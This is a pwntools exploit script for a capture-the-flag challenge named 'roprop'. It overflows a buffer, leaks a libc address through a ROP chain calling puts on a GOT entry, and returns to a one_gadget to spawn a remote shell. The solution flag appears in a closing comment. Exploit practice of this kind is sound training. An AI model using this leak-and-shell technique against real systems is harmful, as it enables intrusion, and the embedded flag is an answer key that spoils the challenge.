from pwn import *

elf = ELF("roprop")
libc = ELF("libc-2.27.so")
rop = ROP(elf.path)
r = remote("pwn.darkarmy.xyz", 5002)
offset = 0x58
one_gadget = 0x4f365
print()

log.info("leaking libc...")
payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got['gets'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

r.recvuntil("He have got something for you since late 19's.\n\n")
r.sendline(payload)

puts = u64(r.recv(6).ljust(8, b'\x00'))
log.info("puts leaked")
log.success("puts --> %s\n\n" % hex(puts))
libc_base = puts - libc.sym['gets']
log.info("libc_base leaked")
log.success("libc_base --> %s\n\n" % hex(libc_base))
shell = libc_base + one_gadget

rop = ROP(elf.path)
payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.sym['exit'])
payload += p64(shell)

r.recvuntil("late 19's.\n\n")
r.sendline(payload)
r.interactive()

# FLAG --> darkCTF{y0u_r0p_r0p_4nd_w0n}
